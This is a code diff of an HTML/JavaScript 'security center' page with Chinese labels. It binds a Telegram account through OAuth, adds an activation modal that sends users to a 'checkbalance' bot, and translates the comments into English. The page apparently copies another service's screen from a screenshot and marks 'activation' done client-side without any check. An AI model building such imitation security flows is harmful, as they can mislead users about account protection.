@@ -4,19 +4,19 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>安全中心</title>
-  <!-- 引入 Tailwind CSS 以实现现代化样式 -->
+  <!-- Tailwind CSS for modern styling -->
   <script src="https://cdn.tailwindcss.com"></script>
-  <!-- 引入 Google Fonts 的 Inter 字体 -->
+  <!-- Google Fonts: Inter -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
-    /* 自定义样式 */
+    /* Custom Styles */
     body {
       font-family: 'Inter', sans-serif;
-      background-color: #f7f8fa; /* 匹配截图中的浅灰色背景 */
+      background-color: #f7f8fa; /* Light gray background to match screenshot */
     }
-    /* 加载动画 (Spinner) */
+    /* Loading Spinner */
     .spinner {
       border: 2px solid rgba(0, 0, 0, 0.1);
       width: 20px;
@@ -29,14 +29,14 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-     /* 自定义 Toast 通知样式 */
-     #toast {
+    /* Custom Toast Notification Style */
+    #toast {
       position: fixed;
-      bottom: 60px; /* 调整位置到中下方 */
+      bottom: 60px;
       left: 50%;
       transform: translateX(-50%);
       padding: 10px 24px;
-      border-radius: 9999px; /* 圆角胶囊形状 */
+      border-radius: 9999px; /* Pill shape */
       color: white;
       background-color: rgba(0, 0, 0, 0.75);
       font-weight: 500;
@@ -49,15 +49,60 @@
       opacity: 1;
       visibility: visible;
     }
+    /* Custom Modal Styles */
+    .modal-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: rgba(0, 0, 0, 0.5);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 2000;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 0.3s, visibility 0.3s;
+    }
+    .modal-overlay.show {
+        opacity: 1;
+        visibility: visible;
+    }
+    .modal-content {
+        background: white;
+        padding: 24px;
+        border-radius: 16px;
+        width: 90%;
+        max-width: 360px;
+        transform: scale(0.95);
+        transition: transform 0.3s;
+    }
+    .modal-overlay.show .modal-content {
+        transform: scale(1);
+    }
   </style>
 </head>
 <body class="text-gray-900">
 
-  <!-- Toast 通知容器 -->
+  <!-- Toast Notification Container -->
   <div id="toast"></div>
 
+  <!-- START: Custom Modal -->
+  <div id="custom-modal" class="modal-overlay">
+    <div class="modal-content text-center">
+      <h3 id="modal-title" class="text-lg font-bold mb-2"></h3>
+      <p id="modal-message" class="text-gray-600 mb-6"></p>
+      <div class="flex justify-center space-x-4">
+        <button id="modal-cancel-btn" class="w-full px-4 py-2 bg-gray-200 text-gray-800 rounded-lg font-semibold hover:bg-gray-300">取消</button>
+        <button id="modal-confirm-btn" class="w-full px-4 py-2 bg-blue-600 text-white rounded-lg font-semibold hover:bg-blue-700">确认</button>
+      </div>
+    </div>
+  </div>
+  <!-- END: Custom Modal -->
+
   <div class="container mx-auto max-w-2xl">
-    <!-- 顶部导航栏 -->
+    <!-- Top Navigation Bar -->
     <header class="flex items-center justify-between p-4 bg-white">
       <button class="p-2">
         <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
@@ -65,15 +110,15 @@
         </svg>
       </button>
       <h1 class="text-lg font-semibold">安全中心</h1>
-      <div class="w-8"></div> <!-- 用于占位，使标题居中 -->
+      <div class="w-8"></div> <!-- Placeholder for centering title -->
     </header>
 
     <main class="p-4 space-y-6">
-      <!-- 账号验证 Section -->
+      <!-- Account Verification Section -->
       <div>
         <h2 class="text-sm text-gray-500 mb-2 px-2">账号验证</h2>
         <div class="bg-white rounded-xl shadow-sm overflow-hidden divide-y divide-gray-100">
-          <!-- 手机 -->
+          <!-- Phone -->
           <div class="flex items-center justify-between p-4 cursor-pointer hover:bg-gray-50">
             <span>手机</span>
             <div class="flex items-center space-x-2 text-gray-500">
@@ -81,7 +126,7 @@
               <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
             </div>
           </div>
-          <!-- 邮箱 -->
+          <!-- Email -->
           <div class="flex items-center justify-between p-4 cursor-pointer hover:bg-gray-50">
             <span>邮箱</span>
             <div class="flex items-center space-x-2 text-gray-500">
@@ -89,14 +134,14 @@
               <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
             </div>
           </div>
-          <!-- Telegram 验证 (动态) -->
+          <!-- Telegram Verification (Dynamic) -->
           <div id="telegram-row" class="flex items-center justify-between p-4 cursor-pointer hover:bg-gray-50">
             <span>Telegram 验证</span>
             <div id="telegram-section" class="flex items-center space-x-2 text-gray-500">
-              <!-- 状态会由 JS 动态填充 -->
+              <!-- Status will be dynamically filled by JS -->
             </div>
           </div>
-          <!-- 谷歌验证 -->
+          <!-- Google Authenticator -->
           <div class="flex items-center justify-between p-4 cursor-pointer hover:bg-gray-50">
             <span>谷歌验证</span>
             <div class="flex items-center space-x-2 text-gray-500">
@@ -104,7 +149,7 @@
               <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
             </div>
           </div>
-          <!-- 通行密钥 -->
+          <!-- Passkeys -->
           <div class="flex items-center justify-between p-4 cursor-pointer hover:bg-gray-50">
             <span>通行密钥</span>
             <div class="flex items-center space-x-2 text-gray-500">
@@ -115,7 +160,7 @@
         </div>
       </div>
 
-      <!-- 密码 Section -->
+      <!-- Password Section -->
       <div>
         <h2 class="text-sm text-gray-500 mb-2 px-2">密码</h2>
         <div class="bg-white rounded-xl shadow-sm overflow-hidden divide-y divide-gray-100">
@@ -136,7 +181,7 @@
         </div>
       </div>
 
-      <!-- 高级设置 Section -->
+      <!-- Advanced Settings Section -->
       <div>
         <h2 class="text-sm text-gray-500 mb-2 px-2">高级设置</h2>
         <div class="bg-white rounded-xl shadow-sm overflow-hidden divide-y divide-gray-100">
@@ -160,27 +205,60 @@
 
   <script type="text/javascript">
     // =================================================================
-    // 配置项
+    // Configuration
     // =================================================================
     const BOT_USERNAME = "Songdacheckbalance_bot"; 
     // =================================================================
 
-    // 获取 DOM 元素
+    // Get DOM Elements
     const telegramSection = document.getElementById('telegram-section');
     const telegramRow = document.getElementById('telegram-row');
     const toast = document.getElementById('toast');
+    const modal = document.getElementById('custom-modal');
+    const modalTitle = document.getElementById('modal-title');
+    const modalMessage = document.getElementById('modal-message');
+    const modalConfirmBtn = document.getElementById('modal-confirm-btn');
+    const modalCancelBtn = document.getElementById('modal-cancel-btn');
 
-    function showToast(message) {
-        toast.textContent = message;
-        toast.className = 'show';
-        setTimeout(() => { toast.className = toast.className.replace('show', ''); }, 2000); // 缩短显示时间
+    // --- Modal Logic ---
+    let confirmCallback = null;
+
+    function showModal(title, message, confirmText = '确认', cancelText = '取消', onConfirm) {
+        modalTitle.textContent = title;
+        modalMessage.textContent = message;
+        modalConfirmBtn.textContent = confirmText;
+        modalCancelBtn.textContent = cancelText;
+        confirmCallback = onConfirm;
+        modal.classList.add('show');
     }
 
+    function hideModal() {
+        modal.classList.remove('show');
+        confirmCallback = null;
+    }
+
+    modalConfirmBtn.addEventListener('click', () => {
+        if (typeof confirmCallback === 'function') {
+            confirmCallback();
+        }
+        hideModal();
+    });
+
+    modalCancelBtn.addEventListener('click', hideModal);
+
+
+    // --- Toast Logic ---
+    function showToast(message) {
+        toast.textContent = message;
+        toast.classList.add('show');
+        setTimeout(() => { toast.classList.remove('show'); }, 2500);
+    }
+
+    // --- Main Application Logic ---
     function setTelegramUIState(state, userData = null) {
         let statusHTML = '';
-        telegramRow.onclick = null; // 清除之前的点击事件
+        telegramRow.onclick = null; // Clear previous click event
 
-        // 【已修复】在 switch 外部先计算好 displayName
         let displayName = '';
         if (userData) {
             displayName = userData.username ? `@${userData.username}` : `${userData.first_name}${userData.last_name ? ' ' + userData.last_name : ''}`;
@@ -199,19 +277,27 @@
                     <span class="text-yellow-500">待激活</span>
                     <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
                 `;
-                telegramRow.onclick = () => {
+                const activationAction = () => {
                     const activationUrl = `https://t.me/${BOT_USERNAME.replace('@', '')}?start=activate`;
                     window.open(activationUrl, '_blank');
                     completeActivation();
                 };
+                telegramRow.onclick = activationAction;
+                // NEW: Show activation modal
+                showModal(
+                    '需要激活', 
+                    '绑定成功！请前往 Telegram 完成最后一步验证以激活功能。',
+                    '前往激活',
+                    '稍后',
+                    activationAction
+                );
                 break;
             case 'activated':
-                // 【已修复】在“已开启”状态下显示用户的 Telegram 用户名
                 statusHTML = `
                     <span class="text-gray-500">${displayName}</span>
                     <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
                 `;
-                telegramRow.onclick = unlinkTelegram; // 点击整行可以解绑
+                telegramRow.onclick = unlinkTelegram; // Click row to unlink
                 break;
             case 'loading':
                 statusHTML = `<div class="spinner"></div>`;
@@ -221,11 +307,12 @@
     }
 
     function bindTelegram() {
-      const botId = '8087175912';
+      const botId = '8087175912'; // It's generally safe to expose bot_id for OAuth
       const origin = encodeURIComponent(window.location.origin);
       
       const currentPath = window.location.pathname;
       const directoryPath = currentPath.substring(0, currentPath.lastIndexOf('/'));
+      // Ensure callback.html is in the same directory
       const returnToUrl = `${window.location.origin}${directoryPath}/callback.html`;
       const returnTo = encodeURIComponent(returnToUrl);
 
@@ -243,7 +330,7 @@
                 setTelegramUIState('activated', userData);
             } else {
                 setTelegramUIState('needs-activation', userData);
-                showToast('绑定成功，请点击激活');
+                // The modal is now shown inside setTelegramUIState
             }
         } else {
             setTelegramUIState('unbound');
@@ -253,30 +340,39 @@
     function completeActivation() {
         localStorage.setItem('telegram_activated', 'true');
         const successData = localStorage.getItem('telegram_auth_success');
-        const userData = JSON.parse(successData);
-        setTimeout(() => {
-            setTelegramUIState('activated', userData);
-            showToast('激活成功！');
-        }, 500);
-    }
-
-    function unlinkTelegram() {
-        // 使用原生 confirm 对话框进行确认
-        if (confirm('您确定要解除与 Telegram 账户的关联吗？')) {
-            localStorage.removeItem('telegram_auth_success');
-            localStorage.removeItem('telegram_activated');
-            setTelegramUIState('unbound');
-            showToast('已解除关联');
+        if (successData) {
+            const userData = JSON.parse(successData);
+            setTimeout(() => {
+                setTelegramUIState('activated', userData);
+                showToast('激活成功！');
+            }, 500); // Small delay to feel responsive
         }
     }
 
-    // 当页面从后台切换回前台时，自动刷新状态
+    function unlinkTelegram() {
+        // NEW: Use custom modal for confirmation
+        showModal(
+            '解除关联', 
+            '您确定要解除与 Telegram 账户的关联吗？', 
+            '确定解绑', 
+            '取消',
+            () => {
+                localStorage.removeItem('telegram_auth_success');
+                localStorage.removeItem('telegram_activated');
+                setTelegramUIState('unbound');
+                showToast('已解除关联');
+            }
+        );
+    }
+
+    // Refresh status when tab becomes visible again
     document.addEventListener('visibilitychange', () => {
         if (document.visibilityState === 'visible') {
             checkAuthStatus();
         }
     });
 
+    // Initial check on page load
     window.addEventListener('load', checkAuthStatus);
   </script>
 
